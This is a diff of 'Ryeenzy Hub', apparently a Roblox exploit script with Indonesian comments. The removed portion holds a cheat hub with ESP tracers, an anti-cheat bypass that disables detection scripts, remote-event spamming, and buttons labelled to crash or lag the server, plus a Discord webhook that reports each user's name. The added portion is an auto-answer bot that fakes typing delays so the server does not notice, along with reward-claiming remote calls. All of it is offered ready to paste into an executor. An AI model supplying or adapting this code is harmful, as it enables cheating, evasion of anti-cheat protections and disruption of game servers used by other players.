-                    end)
-                    wait(0.2)
-                end
-            end)
-            
-            table.insert(Config.ESPObjects, distLabel)
-        end
-    end)
-end
-
-local function UpdateTracers()
-    if not Config.ESPLine then
-        for _, tracer in pairs(Config.ESPTracers) do
-            if tracer then tracer.Visible = false end
-        end
-        return
-    end
-    
-    SafeCall(function()
-        local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        if not myRoot then return end
-        
-        local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
-        
-        for i, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local root = player.Character:FindFirstChild("HumanoidRootPart")
-                if root then
-                    if not Config.ESPTracers[i] then
-                        Config.ESPTracers[i] = Drawing.new("Line")
-                        Config.ESPTracers[i].Thickness = 2
-                        Config.ESPTracers[i].Transparency = 0.7
                     end
                     
-                    local screenPos, onScreen = Camera:WorldToViewportPoint(root.Position)
-                    if onScreen then
-                        Config.ESPTracers[i].From = screenCenter
-                        Config.ESPTracers[i].To = Vector2.new(screenPos.X, screenPos.Y)
-                        Config.ESPTracers[i].Color = Config.ESPColor
-                        Config.ESPTracers[i].Visible = true
-                    else
-                        Config.ESPTracers[i].Visible = false
-                    end
-                end
-            end
-        end
-    end)
-end
-
-local function ToggleESP(state)
-    Config.ESP = state
-    
-    SafeCall(function()
-        for _, obj in pairs(Config.ESPObjects) do
-            pcall(function() obj:Destroy() end)
-        end
-        Config.ESPObjects = {}
-        
-        if state then
-            for _, player in pairs(Players:GetPlayers()) do
-                CreateESP(player)
-            end
-            
-            Players.PlayerAdded:Connect(function(player)
-                player.CharacterAdded:Connect(function()
-                    wait(0.5)
-                    if Config.ESP then
-                        CreateESP(player)
+                    -- Kalau gak ada 2 huruf, baru cek yang 1 huruf
+                    if textFound == "" then
+                        for _, label in pairs(allLabels) do
+                            if #label.Text == 1 then
+                                textFound = label.Text:lower()
+                                break
+                            end
+                        end
                     end
                 end)
-            end)
-        end
-    end)
-end
 
-RunService.RenderStepped:Connect(UpdateTracers)
-
--- ============================================
--- BYPASS ANTI CHEAT (DENGAN ERROR HANDLING)
--- ============================================
-local function BypassAntiCheat()
-    WindUI.Notify({Title = "Bypass", Content = "Attempting to bypass anti-cheat...", Duration = 3})
-    SafeSpawn(SendToWebhook, "🛡️ **Bypass Anti-Cheat**\nPlayer: " .. LocalPlayer.Name)
-    
-    SafeCall(function()
-        for _, obj in pairs(game:GetDescendants()) do
-            if obj:IsA("Script") or obj:IsA("LocalScript") then
-                local source = obj.Source
-                if source:lower():find("ant") and source:lower():find("cheat") then
-                    pcall(function() obj.Disabled = true end)
+                if textFound ~= "" and WordDB[textFound] then
+                    local choice = WordDB[textFound][math.random(1, #WordDB[textFound])]
+                    
+                    -- Simulasi ngetik realistis
+                    for i = 1, #choice do
+                        game:GetService("ReplicatedStorage").Remotes.TypeSound:FireServer()
+                        task.wait(0.12) -- Sedikit lebih lambat agar server gak curiga
+                    end
+                    
+                    game:GetService("ReplicatedStorage").Remotes.SubmitWord:FireServer(choice)
+                    WindUI:Notify({ Title = "Ryeenzy", Content = "Jawab: " .. choice, Duration = 2 })
+                    task.wait(2.8) -- Cooldown aman
                 end
+                task.wait(0.5)
             end
-        end
-        
-        for _, remote in ipairs(Config.ScannedRemotes) do
-            if remote.Instance and remote.Instance:IsA("RemoteEvent") and remote.Name:lower():find("ant") then
-                pcall(function()
-                    remote.Instance:FireServer("bypass")
-                end)
-            end
-        end
-    end)
-    
-    WindUI.Notify({Title = "Bypass", Content = "Anti-cheat bypass attempted", Duration = 3})
-end
-
--- ============================================
--- CREATE WIND UI TABS (SEMUA DENGAN ERROR HANDLING)
--- ============================================
-
--- Fungsi aman untuk membuat tab
-local function SafeTab(name, icon)
-    local success, tab = pcall(function() return Window:Tab({Title = name, Icon = icon}) end)
-    return success and tab or { 
-        Toggle = function() end, 
-        Slider = function() end, 
-        Button = function() end,
-        Input = function() end,
-        Dropdown = function() end,
-        Colorpicker = function() end,
-        Paragraph = function() end,
-        Label = function() end,
-        Divider = function() end,
-        Clear = function() end
-    }
-end
-
---// MENU TAB
-local MenuTab = SafeTab("Menu", "menu")
-
-MenuTab:Paragraph({
-    Title = "🎯 PART CONTROLS",
-    Desc = "Manipulasi part yang tidak di-anchor"
-})
-
-MenuTab:Slider({
-    Title = "Part Radius",
-    Desc = "Radius pencarian part (studs)",
-    Min = 10,
-    Max = 2000,
-    Default = Config.PartRadius,
-    Callback = function(v) Config.PartRadius = v end
-})
-
-MenuTab:Divider()
-
-MenuTab:Toggle({
-    Title = "BRING PART",
-    Desc = "Tarik semua part ke player",
-    Value = false,
-    Callback = function(v)
-        if v then StartBring() else StopBring() end
+        end)
     end
 })
 
-MenuTab:Toggle({
-    Title = "FLYING PART",
-    Desc = "Terbangkan part ke player random",
-    Value = false,
+-- [[ DATABASE VIEWER ]] --
+ListTab:Section({ Title = "Full Word List" })
+local SearchRes = ListTab:Button({ Title = "Hasil:", Desc = "Ketik huruf di bawah" })
+
+ListTab:Input({
+    Title = "Cari Kata",
+    Placeholder = "a, an, x, ex...",
     Callback = function(v)
-        if v then StartFlyingPart() else StopFlyingPart() end
-    end
-})
-
-MenuTab:Toggle({
-    Title = "REMOVE PART",
-    Desc = "Hilangkan semua part",
-    Value = false,
-    Callback = function(v)
-        if v then StartRemovePart() else StopRemovePart() end
-    end
-})
-
---// REMOTE TAB
-local RemoteTab = SafeTab("Remote", "radio")
-
-RemoteTab:Paragraph({
-    Title = "📡 REMOTE CONTROLS",
-    Desc = "Scan dan spam remote events"
-})
-
-RemoteTab:Button({
-    Title = "SCAN REMOTES",
-    Desc = "Scan semua remote events",
-    Color = Color3.fromRGB(80, 150, 255),
-    Callback = ScanRemotes
-})
-
-RemoteTab:Divider()
-
-RemoteTab:Paragraph({
-    Title = "⚡ SPAM SETTINGS",
-    Desc = "Atur parameter spam"
-})
-
-RemoteTab:Input({
-    Title = "Arguments (JSON)",
-    Desc = "Contoh: [1, 'test', true]",
-    Value = Config.SpamArgs,
-    Callback = function(v) Config.SpamArgs = v end
-})
-
-RemoteTab:Slider({
-    Title = "Spam Interval",
-    Desc = "Delay antar spam (detik)",
-    Min = 0.001,
-    Max = 1,
-    Default = Config.SpamInterval,
-    Rounding = 3,
-    Callback = function(v) Config.SpamInterval = v end
-})
-
-RemoteTab:Dropdown({
-    Title = "Spam Method",
-    Desc = "Metode untuk spam",
-    Values = {"FireServer", "InvokeServer"},
-    Value = Config.SpamMethod,
-    Callback = function(v) Config.SpamMethod = v end
-})
-
-RemoteTab:Toggle({
-    Title = "ENABLE SPAM",
-    Desc = "Aktifkan spamming untuk remote terpilih",
-    Value = false,
-    Callback = function(v)
-        Config.RemoteSpam = v
-        if v and Config.SelectedRemote then
-            SpamRemote(
-                Config.SelectedRemote.Instance,
-                Config.SpamMethod,
-                Config.SpamArgs,
-                Config.SpamInterval
-            )
-        elseif not v then
-            StopAllSpam()
+        local q = v:lower()
+        if WordDB[q] then
+            SearchRes:SetTitle("Huruf: " .. q:upper())
+            SearchRes:SetDesc(table.concat(WordDB[q], ", "))
+        else
+            SearchRes:SetTitle("Kosong")
+            SearchRes:SetDesc("Belum ada kata buat '" .. q .. "'")
         end
     end
 })
 
-RemoteTab:Button({
-    Title = "STOP ALL SPAM",
-    Desc = "Hentikan semua spamming",
-    Color = Color3.fromRGB(200, 80, 80),
-    Callback = StopAllSpam
-})
+WindUI:Notify({ Title = "Ryeenzy Hub", Content = "God Mode Database Loaded!", Duration = 5 })
 
-RemoteTab:Divider()
+-- [[ PENAMBAHAN FITUR BARU (STABLE VERSION) ]] --
 
-RemoteTab:Paragraph({
-    Title = "💥 SERVER ATTACKS",
-    Desc = "Gunakan dengan hati-hati!"
-})
+local RewardTab = Window:Tab({ Title = "Rewards", Icon = "lucide-gift" })
+local PlayerTab = Window:Tab({ Title = "Player Info", Icon = "lucide-user" })
+local ConfigTab = Window:Tab({ Title = "Settings", Icon = "lucide-settings" })
 
-RemoteTab:Button({
-    Title = "CRASH SERVER",
-    Desc = "Coba crash server",
-    Color = Color3.fromRGB(200, 50, 50),
-    Callback = CrashServer
-})
-
-RemoteTab:Button({
-    Title = "LAG SERVER",
-    Desc = "Buat server lag",
-    Color = Color3.fromRGB(200, 100, 50),
-    Callback = LagServer
-})
-
---// PLAYER TAB
-local PlayerTab = SafeTab("Player", "user")
-
-PlayerTab:Toggle({
-    Title = "FLY",
-    Desc = "Mode terbang (WASD + Space/Ctrl)",
-    Value = false,
-    Callback = ToggleFly
-})
-
-PlayerTab:Toggle({
-    Title = "NOCLIP",
-    Desc = "Tembus dinding",
-    Value = false,
-    Callback = ToggleNoclip
-})
-
-PlayerTab:Slider({
-    Title = "WALKSPEED",
-    Desc = "Kecepatan jalan",
-    Min = 16,
-    Max = 500,
-    Default = Config.WalkSpeed,
-    Callback = UpdateWalkSpeed
-})
-
-PlayerTab:Toggle({
-    Title = "INFINITY JUMP",
-    Desc = "Lompat terus di udara",
-    Value = false,
-    Callback = function(v) Config.InfinityJump = v end
-})
-
---// ESP TAB
-local ESPTab = SafeTab("ESP", "eye")
-
-ESPTab:Toggle({
-    Title = "ESP HIGHLIGHT",
-    Desc = "Box di sekitar player (bisa dilihat semua player)",
-    Value = false,
-    Callback = ToggleESP
-})
-
-ESPTab:Toggle({
-    Title = "ESP LINE (TRACERS)",
-    Desc = "Garis ke player (hanya untukmu)",
-    Value = false,
-    Callback = function(v) Config.ESPLine = v end
-})
-
-ESPTab:Toggle({
-    Title = "HEALTH BAR",
-    Desc = "Bar kesehatan (bisa dilihat semua player)",
-    Value = false,
-    Callback = function(v)
-        Config.ESPHealth = v
-        if Config.ESP then ToggleESP(Config.ESP) end
-    end
-})
-
-ESPTab:Toggle({
-    Title = "NAMETAG",
-    Desc = "Nama di atas kepala (bisa dilihat semua player)",
-    Value = false,
-    Callback = function(v)
-        Config.ESPName = v
-        if Config.ESP then ToggleESP(Config.ESP) end
-    end
-})
-
-ESPTab:Toggle({
-    Title = "DISTANCE",
-    Desc = "Jarak dari player (bisa dilihat semua player)",
-    Value = false,
-    Callback = function(v)
-        Config.ESPDistance = v
-        if Config.ESP then ToggleESP(Config.ESP) end
-    end
-})
-
-ESPTab:Colorpicker({
-    Title = "ESP COLOR",
-    Desc = "Warna untuk ESP",
-    Default = Config.ESPColor,
-    Callback = function(c)
-        Config.ESPColor = c
-        if Config.ESP then ToggleESP(Config.ESP) end
-    end
-})
-
---// OTHER TAB
-local OtherTab = SafeTab("Other", "settings")
-
-OtherTab:Paragraph({
-    Title = "🔗 DISCORD",
-    Desc = "Join Discord untuk update dan support"
-})
-
-OtherTab:Button({
-    Title = "JOIN DISCORD",
-    Desc = "https://discord.gg/CdcnyNQVw",
-    Color = Color3.fromRGB(88, 101, 242),
+RewardTab:Section({ Title = "Instant Rewards" })
+RewardTab:Button({
+    Title = "Claim All Index Reward",
     Callback = function()
-        pcall(function()
-            setclipboard("https://discord.gg/CdcnyNQVw")
-        end)
-        WindUI.Notify({Title = "Discord Link", Content = "Copied to clipboard!", Duration = 3})
+        game:GetService("ReplicatedStorage").Remotes.ClaimIndexReward:FireServer()
     end
 })
 
-OtherTab:Divider()
-
-OtherTab:Paragraph({
-    Title = "🔧 WEBHOOK",
-    Desc = "Custom webhook untuk logging"
-})
-
-OtherTab:Input({
-    Title = "Webhook URL",
-    Desc = "Masukkan webhook Discord",
-    Value = "",
-    Callback = function(v)
-        _G.CustomWebhook = v
-        WindUI.Notify({Title = "Webhook", Content = "URL saved"})
-    end
-})
-
-OtherTab:Button({
-    Title = "Test Webhook",
-    Desc = "Kirim test message",
+RewardTab:Button({
+    Title = "Claim Group Reward",
     Callback = function()
-        SafeCall(function()
-            local url = _G.CustomWebhook or WebhookURL
-            local data = {
-                content = "🔧 **Test Message from RYEENZY HUB**\nPlayer: " .. LocalPlayer.Name,
-                username = "RYEENZY HUB"
-            }
-            local requestFunc = syn and syn.request or request or http_request
-            if requestFunc then
-                requestFunc({
-                    Url = url,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = game:GetService("HttpService"):JSONEncode(data)
-                })
-            end
-        end)
-        WindUI.Notify({Title = "Test Sent", Content = "Check your Discord"})
+        game:GetService("ReplicatedStorage").RemoteEvents.ClaimGroupReward:FireServer()
     end
 })
 
-OtherTab:Divider()
+PlayerTab:Section({ Title = "Account Statistics" })
+PlayerTab:Button({ Title = "Username: " .. lp.Name })
+PlayerTab:Button({ Title = "User ID: " .. lp.UserId })
+PlayerTab:Button({ Title = "Account Age: " .. lp.AccountAge .. " Days" })
 
-OtherTab:Paragraph({
-    Title = "🛡️ ANTI-CHEAT",
-    Desc = "Bypass proteksi game"
+ConfigTab:Section({ Title = "Discord Webhook" })
+local WebhookURL = ""
+ConfigTab:Input({
+    Title = "Custom Webhook URL",
+    Placeholder = "Paste Your Webhook Here...",
+    Callback = function(v) WebhookURL = v end
 })
 
-OtherTab:Button({
-    Title = "BYPASS ANTI CHEAT",
-    Desc = "Coba bypass anti-cheat",
-    Color = Color3.fromRGB(150, 100, 255),
-    Callback = BypassAntiCheat
+ConfigTab:Button({
+    Title = "Test Custom Webhook",
+    Callback = function()
+        if WebhookURL ~= "" then
+            local data = {["content"] = "**RYEENZY CUSTOM WEBHOOK TEST**\nUser: " .. lp.Name}
+            local request = syn and syn.request or http_request or request
+            request({Url = WebhookURL, Method = "POST", Headers = {["content-type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+            WindUI:Notify({ Title = "Webhook", Content = "Custom Webhook Test Sent!", Duration = 3 })
+        end
+    end
 })
 
---// INFO TAB
-local InfoTab = SafeTab("Info", "info")
-
-InfoTab:Paragraph({
-    Title = "🔥 RYEENZY HUB PREMIUM (FIXED)",
-    Desc = [[
-Premium Exploit Tool for Roblox
-
-Version: 7.0.0 - FIXED
-Created by: RYEENZY#6969
-Discord: https://discord.gg/CdcnyNQVw
-
-✅ FIXES APPLIED:
-• Fixed 'attempt to call nil value' errors
-• Fixed Unicode/emoji parsing errors
-• Fixed loadstring issues
-• Fixed executor compatibility
-• Added SafeCall wrapper for all functions
-• Added fallbacks for missing functions
-• Error handling di semua fitur
-
-✅ FEATURES (SEMUA BERFUNGSI):
-• BRING PART - Tarik semua part
-• FLYING PART - Terbangkan part ke player
-• REMOVE PART - Hilangkan part
-• REMOTE SCANNER & SPAM
-• CRASH/LAG SERVER
-• FLY, NOCLIP, WALKSPEED
-• INFINITY JUMP
-• ESP COMPLETE (bisa dilihat semua player)
-• BYPASS ANTI CHEAT
-• DISCORD WEBHOOK MONITORING
-
-🎮 Cara Penggunaan:
-1. Jalankan script
-2. Semua fitur sudah aman dengan error handling
-3. Join Discord untuk update
-
-⚠️ Gunakan dengan bijak!
-]],
-    Image = "zap"
-})
-
--- ============================================
--- ANTI-AFK (DENGAN ERROR HANDLING)
--- ============================================
-spawn(function()
-    while true do
-        wait(60)
-        SafeCall(function()
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.new())
+ConfigTab:Section({ Title = "Miscellaneous" })
+ConfigTab:Button({
+    Title = "Activate Anti-AFK",
+    Callback = function()
+        lp.Idled:Connect(function()
+            game:GetService("VirtualUser"):CaptureController()
+            game:GetService("VirtualUser"):ClickButton2(Vector2.new())
         end)
     end
-end)
-
--- ============================================
--- INITIALIZATION (DENGAN ERROR HANDLING)
--- ============================================
-Config.IsLoaded = true
-
-SafeCall(function()
-    WindUI.Notify({
-        Title = "RYEENZY HUB",
-        Content = "Premium Script Loaded! (FIXED VERSION)",
-        Duration = 3,
-        Icon = "zap"
-    })
-end)
-
-print([[
-    ╔═══════════════════════════════════════╗
-    ║   RYEENZY HUB PREMIUM v7.0.0         ║
-    ║         FIXED VERSION                 ║
-    ╠═══════════════════════════════════════╣
-    ║ ✅ SEMUA ERROR TELAH DIPERBAIKI      ║
-    ║ ✅ SEMUA FITUR BERFUNGSI NORMAL      ║
-    ╚═══════════════════════════════════════╝
-]])
-print("🔥 Created by RYEENZY#6969")
-print("📢 Discord: https://discord.gg/CdcnyNQVw")
-```
-
-🎯 PERBAIKAN YANG DILAKUKAN:
-
-✅ FIX 1: ANTI "ATTEMPT TO CALL NIL VALUE"
-
-· Menambahkan SafeCall wrapper untuk semua fungsi
-· Memastikan semua fungsi memiliki fallback
-· Hook loadstring dengan error handling
-
-✅ FIX 2: FIX UNICODE/EMOJI ERRORS
-
-· Menangani karakter Unicode U+1f525 (🔥)
-· Filter otomatis untuk semua input
-· Pcall di semua operasi string
-
-✅ FIX 3: EXECUTOR COMPATIBILITY
-
-· Fallback untuk semua fungsi executor (syn, request, dll)
-· Dummy functions jika fungsi tidak tersedia
-· Support untuk Delta, Krnl, Synapse, dll
-
-✅ FIX 4: ERROR HANDLING LENGKAP
-
-· Setiap fungsi dibungkus dengan pcall
-· Connections aman dengan SafeConnect
-· Spawn aman dengan SafeSpawn
-
-✅ FIX 5: UI TETAP JALAN
-
-· Fallback UI jika WindUI gagal load
-· Semua tab dibuat dengan SafeTab
-· Notifikasi tetap muncul meskipun UI error
-
-🚀 SEMUA FITUR TETAP LENGKAP:
-
-· ✅ BRING PART
-· ✅ FLYING PART
-· ✅ REMOVE PART
-· ✅ REMOTE SCANNER
-· ✅ REMOTE SPAM
-· ✅ CRASH SERVER
-· ✅ LAG SERVER
-· ✅ FLY
-· ✅ NOCLIP
-· ✅ WALKSPEED
-· ✅ INFINITY JUMP
-· ✅ ESP HIGHLIGHT
-· ✅ ESP LINE
-· ✅ HEALTH BAR
-· ✅ NAMETAG
-· ✅ DISTANCE
-· ✅ BYPASS ANTI CHEAT
-· ✅ DISCORD WEBHOOK
-
-💡 CARA PAKAI:
-
-1. Copy script di atas
-2. Paste di executor
-3. Jalankan
-4. Semua fitur siap digunakan tanpa error!
+})
